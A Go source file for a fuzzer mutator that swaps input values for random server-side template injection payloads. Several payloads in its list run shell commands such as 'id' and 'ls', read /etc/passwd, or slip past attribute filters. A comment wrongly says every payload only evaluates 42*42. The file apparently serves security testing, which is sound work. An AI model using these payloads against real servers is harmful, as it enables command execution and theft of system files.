package mutation

import (
	"math/rand"
	"reflect"
)

var templateInjectionPayloads = []string{
	"42*42",
	"{42*42}",
	"{{42*42}}",
	"{{{42*42}}}",
	"#{42*42}",
	"${42*42}",
	"<%=42*42 %>",
	"{{=42*42}}",
	"${donotexists|42*42}",
	"[[${42*42}]]",
	"{{2*2}}[[3*3]]",
	"{{3*3}}",
	"{{3*'3'}}",
	"<%= 3 * 3 %>",
	"${6*6}",
	"${{3*3}}",
	"@(6+5)",
	"#{3*3}",
	"#{ 3 * 3 }",
	"{{dump(app)}}",
	"{{app.request.server.all|join(',')}}",
	"{{config.items()}}",
	"{{ [].class.base.subclasses() }}",
	"{{''.class.mro()[1].subclasses()}}",
	"{{ ''.__class__.__mro__[2].__subclasses__() }}",
	"{% for key, value in config.iteritems() %}<dt>{{ key|e }}</dt><dd>{{ value|e }}</dd>{% endfor %}",
	"{{'a'.toUpperCase()}}",
	"{{ request }}",
	"{{self}}",
	"<%= File.open('/etc/passwd').read %>",
	"<#assign ex = \"freemarker.template.utility.Execute\"?new()>${ ex(\"id\")}",
	"[#assign ex = 'freemarker.template.utility.Execute'?new()]${ ex('id')}",
	"${\"freemarker.template.utility.Execute\"?new()(\"id\")}",
	"{{app.request.query.filter(0,0,1024,{'options':'system'})}}",
	"{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}",
	"{{ config.items()[4][1].__class__.__mro__[2].__subclasses__()[40](\"/etc/passwd\").read() }}",
	"{{''.__class__.mro()[1].__subclasses__()[396]('cat /etc/passwd',shell=True,stdout=-1).communicate()[0].strip()}}",
	"{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}",
	"{% for x in ().__class__.__base__.__subclasses__() %}{% if \"warning\" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(request.args.input).read()}}{%endif%}{%endfor%}",
	"{$smarty.version}",
	"{php}echo `id`;{/php}",
	"{{['id']|filter('system')}}",
	"{{['cat\x20/etc/passwd']|filter('system')}}",
	"{{['cat$IFS/etc/passwd']|filter('system')}}",
	"{{request|attr([request.args.usc*2,request.args.class,request.args.usc*2]|join)}}",
	"{{request|attr([\"_\"*2,\"class\",\"_\"*2]|join)}}",
	"{{request|attr([\"__\",\"class\",\"__\"]|join)}}",
	"{{request|attr(\"__class__\")}}", "{{request.__class__}}",
}

// TemplateInjection replaces a value with a random template injection payload
// For more information on template injection: https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/07-Input_Validation_Testing/18-Testing_for_Server_Side_Template_Injection
// Example: Hello -> {{{42*42}}}
type TemplateInjection struct{}

// ID returns mutator's 3-digit ID.
func (m *TemplateInjection) ID() string {
	return "018"
}

// Name returns the mutator's name.
func (m *TemplateInjection) Name() string {
	return "Template Injection"
}

// Description returns the mutator's description.
func (m *TemplateInjection) Description() string {
	return "Replace value with random template injection payload"
}

// CompatibleKinds returns the data types that the mutator can mutate.
func (m *TemplateInjection) CompatibleKinds() []reflect.Kind {
	return []reflect.Kind{reflect.String, reflect.Int, reflect.Int8, reflect.Int16, reflect.Int32, reflect.Int64, reflect.Uint, reflect.Uint8, reflect.Uint16, reflect.Uint32, reflect.Uint64, reflect.Float32, reflect.Float64, reflect.Invalid}
}

// Mutate returns a random template injection payload.
// All payloads attempt to get the templating engine to evaluate 42 * 42
// which means that successful exploitation can be identified by looking for
// the number 1764 in server responses.
// Example: {{{42*42}}}
func (m *TemplateInjection) Mutate(subject reflect.Value, r *rand.Rand) interface{} {
	return templateInjectionPayloads[r.Intn(len(templateInjectionPayloads))]
}
